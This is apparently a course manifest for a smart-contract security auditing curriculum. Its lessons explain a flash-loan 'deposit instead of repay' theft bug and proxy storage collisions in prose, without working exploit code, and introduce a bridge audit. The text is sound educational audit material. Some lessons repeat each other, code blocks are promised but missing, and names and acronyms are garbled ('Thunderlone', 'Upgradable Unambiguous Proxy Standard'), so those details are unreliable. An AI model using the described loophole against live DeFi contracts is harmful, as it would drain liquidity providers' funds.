          This was quite a jog around the DeFi neighborhood and our thrilling exploration of flash loans. Now, take a breather, grab some water or coffee, and let‚Äôs gear up for the next leg of this captivating journey in the fantastic world of blockchain technology!

          Remember, with DeFi and flash loans, the future of finance is truly in your hands.
        description: 'Flash Loan Exploits & Manipulating DEX Prices'
      -
        id: ea331fa9-cbc2-4a7c-b208-6ef48440986d
        type: new_lesson
        enabled: true
        title: 'Exploit: Deposit Instead Of Repay'
        slug: exploit-deposit-instead-of-repay
        duration: 17
        video_url: xBK8ONKHfUhKR502jyhUSOAcW8psGZD3gmo8a8dTQLj00
        raw_markdown_url: /routes/security/6-thunder-loan/42-exploit-deposit-instead-of-repay/+page.md
        markdown_content: |-
          ---
          title: Exploit - Deposit Instead of Repay
          ---

          ---

          ## title: "Uncovering Unexpected Bugs in Defi Smart Contracts with Thunderlone"date: "2021-07-18"author: "DeFi Geek"

          Welcome back fellow DeFi enthusiasts! Get ready as we dive into our awesome bug-hunting exercise featuring - Thunderlone and Thunderlone upgraded.

          In this article, I am excited to reveal not just one, but two juicy bugs for you today. One is in the original Thunderlone smart contract, and the other one is lurking in the upgraded version of Thunderlone, which we'll dissect later on.

          Bear with me as we uncover these bugs and provide strategies to squish them.

          ## Unearthing Bugs in DeFi Smart Contracts

          Before delving into the bugs, let me remind you - you're doing great. If you're new to DeFi, this section might be a little tough, but hang in there, we're almost at the finish line.

          ### Bug Hunting Begins!

          With our newfound expertise in flash loans, we've managed to uncover some interesting behaviors and potential oversights.

          Our journey began with a simple question: _What other ways exist to get money into this contract, outside of repaying or sending assets directly, that can potentially pull it out later?_

          How did we answer this? For this, we ran a quick scan of Thunderlone's methods.

          This gave us a comprehensive overview of all the methods that Thunderlone has, and their respective function signatures. As we analyzed this information, one function jumped out - _deposit_.

          ### The "Deposit" Function ‚Äì A New Way to Leverage the System?

          Until now, deposit was mainly used by whales to put their tokens in and redeem them later. But we started wondering, what if the system allowed us to deposit tokens and then redeem them without calling repay?

          Sounds like a twist in the plot, doesn't it? This interesting loophole sparked our curiosity, leading us to write a proof of code.

          ### Writing Test to Verify The Bug

          Our next step was to create a test scenario. Our test involved initiating a flash loan, after which the user would need to deposit a certain amount.

          ```markdown
          Test scenario:1. Start loan2. Deposit assets3. Redeem money4. Conclude loan
          ```

          ### Test Results ‚Äì Validation of the Bug

          What did we find? We found a loophole ‚Äì stealing money. You heard right! It turns out that our users can manipulate the system by initiating a flash loan and then merely depositing it. Next, they can redeem all the money, causing a huge loss for our liquidity providers.

          Check it out; the test along with the results of this big reveal is available at `test_number1` on our repository.

          ## Thunderlone Upgraded - Examination and Exploration

          With Thunderlone dissected, it was time to aim our magnifying lens on Thunderlone Upgraded. Remember, Thunderlone Upgraded was supposed to be the improved version. Did it hold up to expectations? Let's find out.

          Since this is an upgradable contract, we had two paths to explore:

          1. Starting from scratch - study the code line by line as we did with Thunderlone.
          2. Use **diff** - a command used to spot the differences between two files.

          In this case, we chose the **diff** command as the more efficient approach.

          To see the differences between the two files, we use the diff command:

          Thanks to **diff**, we got a comprehensive report sifting through lines of codes and comments. This method helped us identify that they planned on swapping the storage spots of `sFlash Loan fee` which would lead to a disastrous storage collision issue!

          ### Introducing Storage Collision Attack

          This brings us to our second bug - a _storage collision attack_.

          Take a moment to imagine a world where a programmer decided to make a quick swap in the storage variables. Initially, you may think it's an innocent programming overlook, right? However, it's an altering decision that will wreak havoc on the entire storage structure, leading to a storage collision attack.

          In short, you can't just swap the storage spots!

          In the original Thunder Loan, `sFlashLoanFee` is present at slot 3, but in the upgraded version, it's present at slot 2. This shift increases the chances of a fatal storage collision. As such, the swap would directly affect the asset owners, hence, leading us down the path of financial discrepancy.

          ---

          As a final thought, let me just remind you - no matter how minor the change in the code appears, it can have major impacts on your contract's functionality. In this case, this seemingly insignificant storage variable swap has the potential to lead us down a path of storage collision, causing a significant catastrophe.

          Happy bug hunting!Stay Safe. Stay Decentralized!

          That's all for now, fellow developers and DeFi enthusiasts. See you in the next venture, decoding, dissecting, and debugging DeFi contracts.

          Until then - keep defying, keep decoding!
        description: 'Patrick identifies storage slot swaps that occur in the upgrade process of Thunder Loan potentially leading to storage collisions!'
      -
        id: 4ece65ad-a1e7-405e-9d6c-8f5aaa7f2e45
        type: new_lesson
        enabled: true
        title: 'Exploit: Storage Collision'
        slug: exploit-storage-collision-storage-refresher
        duration: 3
        video_url: EuCI9yCpCAPJ1K200700qQhxOPjVp5t02Ct1HVJp4EoQjw
        raw_markdown_url: /routes/security/6-thunder-loan/43-exploit-storage-collision-storage-refresher/+page.md
        markdown_content: |-
          ---
          title: Exploit - Storage Collision - Storage Refresher
          ---

          # Understanding the Mechanism of Ethereum Smart Contract Storage.

          The vast and innovative landscape of Ethereum smart contracts demands a comprehensive understanding of the subtle ways in which these self-executing bits of code work. In this article, we aim to unpack the operational mechanism of smart contract storage, drawing focus on its organization, types of variables, and implications of upgrades. Without further ado, let's dive straight into understanding contract storage.

          ## Variable Placement in Storage

          Storage, in essence, can be understood as a giant array containing variables. Sequential variables get chronologically placed into this array, with each variable occupying a unique storage slot.

          For instance, let's consider a simple variable - `int256 favoriteNumber`. As a first variable, it's placed into `storage slot 0`. If we add another variable, such as a boolean `bool someValue`, it follows suit and gets stacked into `storage slot 1`.

          ![](https://cdn.videotap.com/fqXHyZ8Wd1AmcWeZV9jE-24.png)

          ### Variable Packing

          While this description captures the essence of storage placement, there's an added layer of complexity; Solidity does some interesting stuff like "packing variables". However, that's a topic for another day. Rest assured, this bit of information won't interfere with the fundamental understanding of storage.

          ## Arrays and Mappings in Storage

          Storage gets slightly trickier to comprehend when dealing with arrays and mappings. The organization of an array is a tad bit complicated - the length of the array gets positioned in a slot analogous to a regular variable. The actual elements of the array, however, find their home in a hash of the storage slot of the array length.

          ![](https://cdn.videotap.com/JMGwpAcocpS7uwDvgxPP-45.png)

          ## The Storage Exceptions: Constants and Function Variables

          Two types of variables are exempted from having storage slots - constants and function variables.

          - **Constants**: Constant variables do not warrant storage slots as they are hard-coded directly into the bytecode. Consequently, we don't need to worry about constant variables while delving into storage.

          - **Function Variables**: Such variables‚Äîoften initialized during the execution of a function‚Äî are temporary and exist only for the duration of the function call. Hence, they are stored in memory space, not in storage slots.

          ## Storage Slots Upon Contract Upgrade

          A key question arises - what happens to the storage slots when a contract is upgraded? Well, the order of variables in our upgraded contract is assigned new storage slots, but it also inherits the previous order of variables.

          > "We've just totally messed up storage by upgrading our contract to some new nonsense."

          Let's say the boolean variable `someBool` was initially in `storage slot 1`, but upon contract upgrade, the variable shifts to `storage slot 2`. This transition recapsulates the flexibility, albeit complexity, of the Ethereum storage structure.

          ![](https://cdn.videotap.com/UvEwzYfKpxND8OGan5AW-114.png)

          In conclusion, understanding the storage behavior in Ethereum smart contracts is fundamental for anyone trying to navigate the rich ecosystem. The mappings and order change can surely create some confusion, but with time and practice, managing storage slots becomes second nature.
        description: 'Dive deep into data storage in Solidity smart contracts, including variables, mappings, arrays, constants, and function-declared variables.'
      -
        id: c0fae74b-3866-49ff-98b8-42cd7c0ae3ce
        type: new_lesson
        enabled: true
        title: 'Storage Collision: Diagram'
        slug: exploit-storage-collision-diagram
        duration: 2
        video_url: dhuoCxUT1dYwkyqoVhWMIdNIg91ZB8Ww5AlZJMAXSgk
        raw_markdown_url: /routes/security/6-thunder-loan/44-exploit-storage-collision-diagram/+page.md
        markdown_content: |-
          ---
          title: Exploit - Storage Collision - Diagram
          ---

          # Understanding Ethereum Smart Contract Proxies and Upgrades

          In the exciting world of Ethereum smart contracts, the design pattern of using proxies for contract upgrades provides an effective solution to the otherwise immutable nature of contracts. However, this approach is not devoid of complexities, and amateur developers may often encounter problems with storage slots during contract upgrades. Let's delve into an illustrative example to understand better how this works.

          ## Fundamentals of Proxy Interaction

          To kick off, let's take a closer look at the basic principles of proxy interaction with smart contracts.

          To put it simply, imagine we have an implementation contract. When a user executes a function, say `setValue(x)`, the call initially goes to the proxy. The proxy is programmed to look at the implementation contract for executing the function. For example, if our contract has an instruction to set its value to `x`, the logic gets sent to the proxy.

          Once inside, the proxy modifies its internal state, storing the new value at a defined storage location. Typically, the first storage slot (slot 0) is used for this purpose.

          This gives us a simplistic view of how the proxy pattern helps align storage with contract implementations.

          ![](https://cdn.videotap.com/WUQkx9srA6tjA8Yo5lRL-42.36.png)

          ## The Upgrade Process: What Happens within the Proxy

          Now let's see what happens when we decide to upgrade our contract.

          In an upgrade scenario, the proxy points from implementation contract `A` to a new implementation contract `B`. However, the storage inside the proxy remains intact. It will simply start referring to the new contract to carry out its logic.

          > Note: The essence of the upgrade process is that the proxy's storage does not get changed or migrated. It just adopts a new source of instruction.

          ![](https://cdn.videotap.com/gKwLO8tKUQsQFgdhAmZB-72.62.png)

          ## Potential Issues with Storage Slot Misalignment

          The seamless continuation of storage masks a potential pitfall ‚Äì storage slot misalignment. If the new implementation isn't mindful of how the storage was structured in the previous implementation, chaos can erupt!

          Let's continue our example to see how. Our user calls `setValue(10)` which now points to logic `B`. If `B` has instructions that alter the storage structure like,

          In this situation, `value` gets stored in slot 1 since `initialized` has taken up slot 0. Now, proxy's storage looks completely different with value 5 still in slot 0 and the new value of 10 in slot 1.

          Storage slot misalignment might result in overriding storage slots, uninitialized variables, and other issues leading to potential contract vulnerabilities.

          ![](https://cdn.videotap.com/nvkgWHqUU232F6YtZgQD-111.95.png)

          ## Diving Deeper with Remix

          To see this in action and further understand, we can use Ethereum's browser-based IDE, [Remix](https://remix.ethereum.org/). In the follow-up post, we'll walk through an immersive hands-on example using Remix to intricately explore the subtleties of contract upgrades and proxy interactions. Stay tuned!
        description: 'Explore a Remix demonstration of storage collision and the dive into the potential impacts of it on upgradeable smart contract protocols.'
      -
        id: 3bc7ad4f-9c3f-441c-921e-a3af7b50f5a9
        type: new_lesson
        enabled: true
        title: 'Storage Collision: Remix Example'
        slug: exploit-storage-collision-remix-examplee
        duration: 4
        video_url: Ve7UtIWnU8btUpoL901HBjaaqSN006st9wo4nczp856fg
        raw_markdown_url: /routes/security/6-thunder-loan/45-exploit-storage-collision-remix-examplee/+page.md
        markdown_content: |-
          ---
          title: Exploit - Storage Collision - Remix Example
          ---

          # Understanding the Storage Collision in Ethereum Smart Contracts

          In this blog post, we're going to dive deep into understanding one of the common issues Ethereum smart contract developers encounter: the storage collision. In this exploration, we'll utilize Storage Collision, a contract we've sketched in Remix ‚Äî an open-source tool developed by the Ethereum community to help you build smart contracts.

          ## Introduction to Storage Collision Contract

          Scroll down in the remix interface and you'll come across the Storage Collision contract. Opening this contract, there are quite a number of lines to dissect. You'll see a special type of contract called `proxy`. Its pivotal role is to call the `set implementation` function.

          There are also helper functions in this contract whose primary task is to read data from the contract. For example, the `readStorage` function checks and fetches the value stored in a specific storage slot.

          ## Implementation A and B and their peculiarities

          The contract contains two distinct implementations labeled as `implementation A` and `implementation B`, mirroring what was shown in the initial diagram.

          - **Implementation A** has `value` located at storage slot zero.
          - **Implementation B** is a bit more complex with `initialized` at storage slot zero. By default, `initialized` should be `false`. But if there's a value in the corresponding slot, `initialized` becomes `true`.

          ## Deployment and Compilation

          Next on the stop, is to compile and deploy these contracts: `Implementation A`, `Implementation B`, and `Storage Collision Proxy`. It's important to note that the `Storage Collision Proxy` is first associated with the contract address for `implementation A`.

          Now, we've set our Proxy to point to `implementation A` and we can interact with it accordingly.

          ## Interacting with Implementation A

          To do this, copy the Proxy address into `implementation A`, allowing us to work directly with `implementation A`.

          When we check the `value`, it reads '0' because we haven't assigned any value yet. But when we assign 15 to the `value`, the `value` in `implementation A` changes to 15.

          It's worth noting that in solidity, anything aside from 0 is considered `true`. Hence, the `bool public initialize` in `implementation B` is expected to default to `false`. But let's see if that's the case.

          ## Transition to Implementation B and the Twist

          Switching to `Implementation B`, we change the implementation address in our `Storage Collision Proxy` and then inspect the `value`.

          Surprisingly, our `value` reads zero - this is because we have upgraded the contract. However, we can imitate the previous process with `implementation A` and interact with `implementation B`.

          When we call `initialized`, contrary to the default being `false`, it returns `true`. This happens because within the proxy, the `readStorage()` function is indicating that there's a '15' at storage slot zero.

          Since `initialized` is coupled to storage slot zero, the non-zero value makes it return `true`.

          The next process is to set the `value` of `implementation B` to a new number, which affects the `storage slot one`.

          The consequence of this action reveals a **storage collision**.

          > In essence, the 'storage collision' is a situation whereby values in the storage slots overlap as a result of an upgrade, causing unexpected changes in the system.

          ## In Conclusion

          In Ethereum smart contracts, collision issues are something we ought to be wary about. As we've noticed, our upgraded contract seems to be colliding due to these issues, causing unintended changes in the system. Careful architecture of contracts and more thorough analysis are needed to mitigate this risk. As always, understanding the underpinnings of the system and how actions interact with it is key to a successful deployment and operation of your Ethereum smart contracts.
        description: 'Patrick explains how to set up and run an assertion test for detecting storage collisions during smart contract upgrades.'
      -
        id: d36939fe-b02e-45d5-9d22-4eba1bf60575
        type: new_lesson
        enabled: true
        title: 'Storage Collision: PoC'
        slug: exploit-storage-collision-poc
        duration: 3
        video_url: DjxH2VIkbso7ztm1Mv1AIyUCROCftVZqQfrkBBFR1nI
        raw_markdown_url: /routes/security/6-thunder-loan/46-exploit-storage-collision-poc/+page.md
        markdown_content: |-
          ---
          title: Exploit - Storage Collision - PoC
          ---

          # Code Proving 101: An In-Depth Walkthrough in Upgrading Solidity Contracts

          Welcome to our walkthrough of writing a proof-of-code for Solidity contracts. Here, we'll be outlining a detailed practice on how you can handle upgrades - an essential part of maintaining and improving smart contracts. The entire process is clear-cut, so don't be shy about getting your hands dirty with code.

          ### The Test Unit

          Conveniently, we'll be examining a test unit called Thunderlone, which has an upgrade function we will dissect. Below we will act as the owner of Thunderlone, including deploying a new logic address and making an upgrade proxy call.

          At this point, we fetch the fee before making any changes and state a new `ThunderloneUpgraded`.

          ![](https://cdn.videotap.com/KgYyc5GgyHgGV9f1xeiW-44.57.png)

          Intriguing right? But, not so fast! We‚Äôve missed something vital. Just before diving to that, we ought to import the upgraded protocol at the top of the test page. Here, `ThunderloneUpgraded.sol` is the Solidity script that defines our `ThunderloneUpgraded` contract.

          With that code added, we now have access to the `ThunderloneUpgraded` contract we instantiated earlier.

          ### Handling the Upgrade

          The next crucial part involves calling Thunderlone's upgrade function.

          For our purpose, there's no data to call, hence the "0x". This function upgrades the proxy to the upgraded address, nifty right?

          ### Assertions

          Once we log the fees, we come to our final part - asserting that the `feeBeforeUpgrade` indeed changed from `feeAfterUpgrade`.

          This simple test will tell if there is a discrepancy in the fees, which would mean our upgrade tinkered with more than it should have, causing storage collisions.

          ### Running the Tests

          We are now ready to run this forge test. It's pretty scary how such small changes can end up making mega alterations, right?

          Keep crafting your test units as you explore the vast world of Solidity. Don't be too hard on yourself; it takes a few trial and errors before you become a pro! And remember, learning is a never-ending journey. :)

          Happy testing!
        description: 'Patrick walks through the proof of code for our discovered storage collision vulnerability.'
      -
        id: 58af1688-efa6-4821-86af-6adce089437c
        type: new_lesson
        enabled: true
        title: 'Reporting: Storage Collision'
        slug: exploit-storage-collision-write-up
        duration: 7
        video_url: 2vM1n1LgRGWdIWrYSTOwO4PJjFQ5yjDMycUmO00noceI
        raw_markdown_url: /routes/security/6-thunder-loan/47-exploit-storage-collision-write-up/+page.md
        markdown_content: |-
          ---
          title: Exploit - Storage Collision - Write Up
          ---

          # Debugging and Improving Your Solidity Code with Thunder Loan

          In this blog post, we will take a closer look at how to test, debug and improve your Solidity code, using our Thunder Loan example. Solidity, for those who are less familiar, is a statically typed, contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.

          Let's dive right into it.

          ## Starting with the Git Checkout and Stashing Changes

          First, let's pull up our Thunder Loan test. After reviewing the code, it is advisable to stash your changes. Stashing is a great feature of Git that allows you to take a snapshot of your current changes, store them off to the side on a stack of unfinished changes, and then reapply them later.

          After stashing, I switch the currently active branch to 'demo' using git checkout command.

          ## Understanding the Impact and Likelihood of Issues

          Before wrapping things up, it is essential to consider the impact and likelihood of the issue in question.

          In our current setting, the impact is high; primarily because the upgrade could potentially lead to what is referred to as a 'storage collision'; a serious problem whereby addresses of storage variables overlap, causing unexpected behaviours. These could inadvertently skew the fees associated with our Thunder Loan.

          ![](https://cdn.videotap.com/MJYevuA6WF1Wcqj3AgIR-148.52.png)

          The likelihood of this occurring can be medium to low. However, it tends to lean towards a higher likelihood considering that an upgrade was planned.

          The key here is to understand your protocol's likelihood and impact of the storage collision issues, which is a very common pain-point when it comes to proxy contract upgrades.

          ## Identifying the Root Cause

          A root cause analysis reveals that variable location mix-ups can result in storage collisions. In our Thunder Loan case, the problem arises in the _Flash Loan fee_ and the process of _Flash Loaning_. The severity of this problem means that it could potentially paralyze the entire protocol due to the storage location mismatches.

          An example of wrongly mapped variable storage location is as follows:

          While for the upgraded contract, `thunderloanupgraded.sol`, the storage layout difference is slightly different:

          Storage location inconsistencies not only directly impact your protocol's modification, but they can also freeze up the protocol.

          ## Potential Mitigations and Recommendations

          To mitigate such an issue, it is recommended to maintain constant variables when removing and introducing storage variables.

          ![](https://cdn.videotap.com/EsivAEC6dyzbBCAvtsGP-267.33.png)

          This recommendation is based on the understanding that storage layouts are very important to the solidity coding structure ‚Äì modifying them could lead to unexpected errors.

          You can compare the storage layout difference by running the commands:

          If a storage variable must be removed, leave a blank to avoid messing up the storage slots. Here's what it would look like:

          ## Wrapping Up

          In this post, we have walked through not just the intricacies of debugging and improving solidity code, but also the complexities that proxy contracts introduce. It's no surprise that some developers see proxies as a necessary evil while others view them as progress in the smart contract sphere.

          Whether you side with the 'Bad News Bears' or 'Great Progress' team, we strongly encourage you to share your view in our ongoing community discussion!

          As for our next step with Thunder Loan, that will largely consist of doing the reporting. Stay tuned for more updates in that regard. Happy coding until then!
        description: 'Learn about storage collision in upgradeable contracts. Addresses the significance of proxies and their role in centralization within Web3.'
      -
        id: 0999f95c-f86e-4739-824d-8565169cfe2f
        type: new_lesson
        enabled: true
        title: 'Wrapping Up'
        slug: wrapping-up
        duration: 2
        video_url: un3Q5qFoTpb7xNzlxhxL2019n7iRzPk1tonjNREHf700o
        raw_markdown_url: /routes/security/6-thunder-loan/48-wrapping-up/+page.md
        markdown_content: |-
          ---
          title: Wrapping Up
          ---

          # Debugging and Improving Your Solidity Code with Thunder Loan

          In this blog post, we will take a closer look at how to test, debug and improve your Solidity code, using our Thunder Loan example. Solidity, for those who are less familiar, is a statically typed, contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine.

          Let's dive right into it.

          ## Starting with the Git Checkout and Stashing Changes

          First, let's pull up our Thunder Loan test. After reviewing the code, it is advisable to stash your changes. Stashing is a great feature of Git that allows you to take a snapshot of your current changes, store them off to the side on a stack of unfinished changes, and then reapply them later.

          After stashing, I switch the currently active branch to 'demo' using git checkout command.

          ## Updating the Protocol

          Next, I paste our Proof of Concept (POC) into the current branch. For this, the Thunder Loan upgraded protocol needs to be imported from the respective source folder.

          The code for this would look like:

          At this point, a test run is required to ensure everything runs smoothly.

          This command runs the test that we just added, confirming its successful implementation.

          ## Understanding the Impact and Likelihood of Issues

          Before wrapping things up, it is essential to consider the impact and likelihood of the issue in question.

          In our current setting, the impact is high; primarily because the upgrade could potentially lead to what is referred to as a 'storage collision'; a serious problem whereby addresses of storage variables overlap, causing unexpected behaviours. These could inadvertently skew the fees associated with our Thunder Loan.

          The likelihood of this occurring can be medium to low. However, it tends to lean towards a higher likelihood considering that an upgrade was planned.

          The key here is to understand your protocol's likelihood and impact of the storage collision issues, which is a very common pain-point when it comes to proxy contract upgrades.

          ## Identifying the Root Cause

          A root cause analysis reveals that variable location mix-ups can result in storage collisions. In our Thunder Loan case, the problem arises in the _Flash Loan fee_ and the process of _Flash Loaning_. The severity of this problem means that it could potentially paralyze the entire protocol due to the storage location mismatches.

          ## Potential Mitigations and Recommendations

          To mitigate such an issue, it is recommended to maintain constant variables when removing and introducing storage variables.

          ![](https://cdn.videotap.com/MJYevuA6WF1Wcqj3AgIR-148.52.png)

          This recommendation is based on the understanding that storage layouts are very important to the solidity coding structure ‚Äì modifying them could lead to unexpected errors.

          ## Wrapping Up

          In this post, we have walked through not just the intricacies of debugging and improving solidity code, but also the complexities that proxy contracts introduce. It's no surprise that some developers see proxies as a necessary evil while others view them as progress in the smart contract sphere.

          Whether you side with the 'Bad News Bears' or 'Great Progress' team, we strongly encourage you to share your view in our ongoing community discussion!

          As for our next step with Thunder Loan, that will largely consist of doing the reporting. Stay tuned for more updates in that regard. Happy coding until then!
        description: 'Learn to create your own audit report with Pandoc! Patrick encourages you to sign up for first flights and join competitive audits on CodeHawks.'
      -
        id: 04952e33-4469-4ae7-8848-e964fc003ee4
        type: new_lesson
        enabled: true
        title: 'Section 6 Recap'
        slug: section-6-recap
        duration: 6
        video_url: X02Z901eEf1F4TaMTbnG3VY31sCSEwFmxwmL8rpslepto
        raw_markdown_url: /routes/security/6-thunder-loan/49-section-6-recap/+page.md
        markdown_content: |-
          ---
          title: Section 6 - Recap
          ---

          .

          ## Unraveling the Flash Loans on Thunder Management Protocol

          Firstly, let's talk about flash loans, the key feature of the Thunder Management Protocol. Flash loans are innovative DeFi tools that allow users to borrow substantial amounts of assets for one single transaction. They have gained prominence due to their significant use in arbitrage opportunities, previously only utilized by prolific investors, fondly known as 'whales'. With flash loans, however, anyone can seize these golden opportunities.

          ![](https://cdn.videotap.com/XdZhyn8C3rqPpi7yPlNe-50.31.png)

          > "Flash loans are phenomenal DeFi primitives turning anyone into a whale."

          As security researchers, we recognize the importance of understanding top protocols like Aave and Compound. This foundational knowledge provides us with necessary context for quicker and more efficient future project comparisons. Moreover, we've realized using an AMM(Automated Market Maker) or a DEX(Decentralized Exchange) protocol as a pricing oracle is a poor choice. Instead, a decentralized price feed like Chainlink should be on your go-to list for robust and secure oracle solutions.

          ## Shedding Light on Proxies and their Risks

          We discussed the significant implications of utilizing proxies in contract development, particularly UUPS(Upgradable Unambiguous Proxy Standard). Proxies can lead to dreaded risks such as centralization and storage collisions if not handled carefully. However, our discussion did not extensively cover the transparent proxy or the multi-faucet proxy‚Äîimportant topics available for further research.

          ![](https://cdn.videotap.com/rq3TwsRcnxoecVEB3Kir-138.35.png)

          One intriguing topic we brushed upon is 'malicious scope'. Sometimes, while auditing a codebase, a protocol might ask you to ignore auditing a certain part. Interestingly, that often is the part housing the rug pull. As analysts, it's important to snuff out such malicious intentions. If you keep missing the red flags and all audited projects end in rug pulls, it reflects poorly on your auditing abilities. At the very least, all potential risks should be plainly stated in the audit report, serving as a potential alarm for the readers.

          ## Introduction to Useful Tooling and Strategies

          Exploring some handy tools, we touched briefly upon Upgrade Hub, a powerful tool highlighting how often protocols have undergone silent upgrades‚Äîsome rather misleading ones, though. In addition, we dug into some fascinating exploits, especially the infamous failure to initialize contracts. Important note: always ensure contracts you're analyzing or designing have a method deployed to authenticate contract initializations.

          ![](https://cdn.videotap.com/WZFqXvkBGJ6wgC3VdPJ0-188.65.png)

          Talking about the infamous Oasis case study, it served as a prime example demonstrating the repercussions of protocol centralization, reminding us of the potential rug pull danger lurking beneath the surface of centralized architectures. Remember to signal such major centralization risk in your audit reports.

          Another important topic was Oracle and price manipulations. A considerable number of Oracle manipulation attacks pose high risks, reinforcing our advice not to use an AMM as your pricing Oracle.

          We concluded our section with design patterns, aiding in understanding the underlying operational concepts in smart contract development.

          ## Concluding Remarks and How to Move Forward

          Admittedly, this section is information-dense and might seem confusing at first glance. However, remember to interact with fellow developers, share insights, ask questions, and contribute to discussions on platforms such as our Cypher Updraft community. You‚Äôll find yourself gradually familiarizing with the concepts, making them seem less daunting.

          ![](https://cdn.videotap.com/aXjjMtL66bz5IgquDe55-264.12.png)

          Onwards, we're heading to section seven, offering riveting insights about Boss Bridge and its inner workings. It's going to be an intriguing journey into Yul and Assembly's realm‚Äîan important break from our previous section.

          A massive thank you to everyone following along on this informative journey. Your perseverance and eagerness to learn have made this adventure fun and informative, equally. Remember, it's okay to take a breather, get some coffee, maybe go for a good workout, rest, and come back ready to dive deeper into this fascinating world of blockchain and smart contracts.

          Okay then, are we ready to dive into section seven? Great! Let‚Äôs begin our exploration.

          ![](https://cdn.videotap.com/i3PPe1YFwpZgqTiGNVBF-314.42.png)
          s
        description: 'Patrick emphasizes the importance of knowing popular protocols. He recaps exploits like failure to initialize, storage collisions, centralization, oracle price manipulation.'
    type: new_section
    enabled: true
  -
    id: 3RRvoA0H
    title: 'Boss Bridge'
    slug: bridges
    lessons:
      -
        id: 0f5c515e-a28a-4a32-abcc-1e81b432b1b8
        type: new_lesson
        enabled: true
        title: Introduction
        slug: part-intro
        duration: 5
        video_url: UOd1naVgBvDrM6bfbDEunjXlMo4rq7HqvZ0002Ree102Zs
        raw_markdown_url: /routes/security/7-bridges/1-part-intro/+page.md
        markdown_content: |-
          ---
          title: Introduction
          ---



          ---

          # Unveiling Section Seven of Security and Auditing EVM DeFi: A Comprehensive Security Review

          Welcome back, enthusiastic coders! Brace yourselves for an exciting deep dive into Section Seven of the Security and Auditing EVM DeFi. In this intriguing space, we are going to roll up our sleeves and immerse in not less than five detailed security reviews or audits. Stay tuned for more in part two as well.

          ## Flashback to Thunder Loan

          We have recently waved goodbye to the thrilling Thunder loan security review and audit, an eye-opener in the world of Decentralized Finance (DeFi). The concept explored here, ranging from flash loans to Oracle manipulation encapsulates the primary attacks presently haunting DeFi.

          ![](https://cdn.videotap.com/j6Dr40RzmumPq9jhPJY3-36.13.png)

          ### New Concepts Unfolded

          Our journey shed light on a multitude of aspects essential for better understanding the DeFi landscape, including price Oracle manipulation, reward manipulation, insufficient function access control, and a gamut of logic errors, function parameter validation, misconfigurations and reentrancies.

          While these are considerable advancements, we are yet to uncover every crevice of the DeFi sphere. More obscure areas, such as governance attacks and stolen private keys, are yet to be traversed. Fortunately, we will unveil these mysteries and delve deeper into the riveting world of DeFi security in this seventh chapter.

          ## Sneak Peek into Section Seven

          Primarily, we will scrutinize the Seven Boss Bridge audit code base, currently available for the first flight on the [CodeHawks platform](https://www.codehawks.com).

          ![](https://cdn.videotap.com/LLXHIyWzga7BHJru6Wjv-90.31.png)

          ### The Power of CodeHawks

          Remember, reading and evaluating security reviews is an effective way to level-up your skills. If tech-upscaling piques your interest, Code Hawks curates a vast array of first flights that are worth exploring. Furthermore, signing up for CodeOx posts and participating in competitive audits can be quite advantageous.

          ### Repo Overview and Tooling Upgrades

          Exploring this chapter's repo, we will first notice two conventional branches: `main` and `audit data`, where `audit data` hosts the answer keys (no peeking!).

          We will explore varying Ethereum Virtual Machine (EVM) chains such as Arbitrum, Optimism, ZKSync, and Ethereum. We will ponder whether these are analogous or have unique features that set them apart.

          Furthermore, we will explore tools, Tenderly and Solidit, which will aid us in streamlining our code review process.

          ### The Hans Checklist: A Systematic Approach to Coding Reviews

          Next, we delve into a novel system for conducting smart contract security reviews: the Hans Checklist.

          Towards the end of this section, we'll break down Hans' trend-setting checklist methodology, which helped him ascend to the rank of top competitive auditor globally for the first half of 2023.

          ## The Classic Security Review Steps and Exciting Case Studies

          As before, we will follow the classical method for security reviews, incorporating scoping, reconnaissance, vulnerability identification, writeups, and reporting. We will also look at the intriguing case studies based on various chains, including Polygon, ZK Sync, and how different chains actually work with different opcodes.

          In this part, we will focus more on bridge hacks as these were rampant in the year 2022. Most bridge hacks we noticed unfortunately happened due to centralized controls and the loss of private keys, leading to bizarre exploitations.

          We will also study several exciting exercises that include researching some attacks and doing write-ups on them. Some significant aspects would be Signature Replay, merkel tree, signature issues, polygon double spend, and nomad bridge hack.

          ## Onwards with the Contract Scoping Phase

          Finally, after discussing the technicalities, we will commence with the scoping phase of the contract that will be considerably quicker this time. Following the scoping, we will move on to the actual security review of the contract.

          Remember, there are conceivably more issues than we cover. Thus, if you stumble across some extra issues, don't hesitate to share your insights!

          Brace yourselves‚Äîwith all that we have in store, we're sure to add significant value to your coding and auditing skills, inspiring you to dive deeper into the mesmerizing world of coding.
        description: 'Patrick introduces the Boss Bridge protocol and the sorts of concepts that will be covered in this section.'
      -
        id: d52feb22-38e1-4616-b8e6-274c58a892b6
        type: new_lesson
        enabled: true
        title: 'Phase 1: Scoping'
        slug: phase-1-scoping
        duration: 6
        video_url: CrqWU5yUS69Y00Jzrrr6Rc1pc4t5uUX00sMtUNPcNUKas
        raw_markdown_url: /routes/security/7-bridges/2-phase-1-scoping/+page.md
        markdown_content: |-
          ---
          title: Phase 1: Scoping
          ---

          _Follow along with the video lesson:_



          ---

          # Kick-starting our Security Audit: The Boss Bridge Project Case Study

          In this extensive blog post, we're going to dive into the world of security auditing, using an example project: Boss Bridge. We'll begin in a familiar place, assuming you've just downloaded the project through GitHub, opened a fresh VS Code window, and you're ready to explore.

          ## Getting Started: The Importance of Pre-boarding

          When auditing any project‚Äôs codebase, a key step in your preparation should be notetaking: scribbling down your thoughts, ideas and key points in your 'notes' section or equivalent. Think of it as your own personal checkpoint system.

          As you delve further into the codebase, your entity list should grow into a robust compilation. This helps keep track of vulnerabilities, concepts to revisit, and potential threat vectors that could minimise attacks. Just like a detective unravelling the clues, your notes provide the foundation of a thorough investigation.

          ## Understanding the project scope

          Once you've downloaded the code, the next step is to determine the overall project scope. Begin by investigating the 'src' folder, opening the README file, and understand its core facets.

          ![](https://cdn.videotap.com/Z6FwLQhDRCyW6ZPk1OQ4-80.11.png)

          To determine the full extent of the project, you'll need to scrutinize the audit scope details particularly. Here, you'll uncover details of the commit hash, the contracts and tokens, any unusual behaviors, and even the expected deployment chains.

          ### Holler Out for More Information

          Don't hesitate to reach out if you need additional data. Developing a comprehensive understanding of this project is pivotal, and while speed is critical, you want to ensure you aren't missing critical elements. Request more diagrams, data, and subsequent supporting information as needed.

          ### An Overview of the Contracts

